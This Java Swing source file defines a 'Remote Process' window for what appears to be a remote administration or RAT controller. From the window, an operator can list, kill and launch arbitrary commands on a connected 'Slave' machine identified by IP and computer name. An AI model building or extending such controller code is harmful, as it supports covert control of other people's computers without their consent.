package com.redpois0n.ui.frames;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.table.DefaultTableModel;

import com.redpois0n.Slave;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.OutgoingHeader;
import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.ui.renderers.table.ProcessTableRenderer;
import com.redpois0n.utils.Util;

@SuppressWarnings("serial")
public class FrameRemoteProcess extends JFrame {

	public static final HashMap<Slave, FrameRemoteProcess> instances = new HashMap<Slave, FrameRemoteProcess>();
	
	public DefaultTableModel model;
	
	private JPanel contentPane;
	private Slave slave;
	private JTable table;
	private JButton btnCreateProcess;
	private JButton btnKillSelected;
	private JButton btnRefresh;

	public FrameRemoteProcess(Slave sl) {
		setTitle("Remote Process - " + sl.getIP() + " - " + sl.getComputerName());
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteProcess.class.getResource("/icons/process_no.png")));
		setResizable(false);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				exit();
			}
		});
		this.slave = sl;
		instances.put(sl, this);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 535, 326);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JButton btnClearList = new JButton("Clear list");
		btnClearList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});
		btnClearList.setIcon(new ImageIcon(FrameRemoteProcess.class.getResource("/icons/clear.png")));
		
		btnCreateProcess = new JButton("Create process");
		btnCreateProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String proc = Util.showDialog("Create process", "Input name of process");
				if (proc == null) {
					return;
				}
				proc = proc.trim();
				
				clear();
				
				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, new String[] { proc }));
							
				list();
			}
		});
		btnCreateProcess.setIcon(new ImageIcon(FrameRemoteProcess.class.getResource("/icons/process.png")));
		
		btnKillSelected = new JButton("Kill selected");
		btnKillSelected.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (model.getValueAt(table.getSelectedRow(), 0) != null) {
					String data;
					if (slave.getOS() == OperatingSystem.WINDOWS) {
						data = model.getValueAt(table.getSelectedRow(), 0).toString();
					} else {
						data = model.getValueAt(table.getSelectedRow(), 1).toString();
					}
					
					clear();
					
					slave.addToSendQueue(new PacketBuilder(OutgoingHeader.KILL_PROCESS, new String[] { data }));				
					
					list();
				}
			}
		});
		btnKillSelected.setIcon(new ImageIcon(FrameRemoteProcess.class.getResource("/icons/delete.png")));
		
		btnRefresh = new JButton("Refresh");
		btnRefresh.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
				list();
			}
		});
		btnRefresh.setIcon(new ImageIcon(FrameRemoteProcess.class.getResource("/icons/update.png")));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(btnClearList)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnCreateProcess)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnKillSelected)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnRefresh))
						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 517, GroupLayout.PREFERRED_SIZE))
					.addContainerGap(98, Short.MAX_VALUE))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 258, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnClearList)
						.addComponent(btnCreateProcess)
						.addComponent(btnKillSelected)
						.addComponent(btnRefresh))
					.addContainerGap(61, Short.MAX_VALUE))
		);
		
		table = new JTable();
		table.setRowHeight(25);
		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
		table.setModel(new DefaultTableModel(
			new Object[][] {
			},
			new String[] {
				"Name", "Process ID", "Session name / Time", "Memory usage"
			}
		));
		model = (DefaultTableModel) table.getModel();
		table.getColumnModel().getColumn(0).setPreferredWidth(137);
		table.getColumnModel().getColumn(2).setPreferredWidth(115);
		table.getColumnModel().getColumn(3).setPreferredWidth(87);
		scrollPane.setViewportView(table);
		contentPane.setLayout(gl_contentPane);
	}
	
	public void list() {
		slave.addToSendQueue(OutgoingHeader.LIST_PROCESSES);
	}
	
	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
	
	public void exit() {
		instances.remove(slave);
	}
}
